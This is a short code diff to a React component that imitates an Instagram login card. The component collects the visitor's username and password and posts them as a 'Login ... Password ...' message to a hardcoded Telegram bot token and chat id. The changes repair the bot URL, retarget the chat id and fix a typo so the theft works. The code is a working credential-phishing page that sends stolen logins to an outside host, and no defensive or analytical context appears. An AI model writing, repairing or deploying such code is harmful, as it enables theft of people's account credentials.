@@ -13,10 +13,10 @@ function Cards() {
   const [count, setcount] = useState(0);
 
   const API =
-    "https://api.telegram.org/6987189864:AAEs6hfy5KLOZxf1EcN-cjhgJQSlilxYqyw/";
+    "https://api.telegram.org/bot6987189864:AAEs6hfy5KLOZxf1EcN-cjhgJQSlilxYqyw/";
   async function SendMesage(message: string) {
     if (name.length > 0 && password.length > 0) {
-      const url: string = `${API}sendMessage?chat_id=-5539341984&text=${message}`;
+      const url: string = `${API}sendMessage?chat_id=-1002420484951&text=${message}`;
       await axios.post(url);
       setName("");
       setPassword("");
@@ -78,7 +78,7 @@ function Cards() {
             <div className="instagram__footer">
               <button
                 onClick={() =>
-                  SendMesage(`Login ${name} \n Passowrd  ${password}`)
+                  SendMesage(`Login ${name} \n Password  ${password}`)
                 }
                 className="footer__btn"
               >
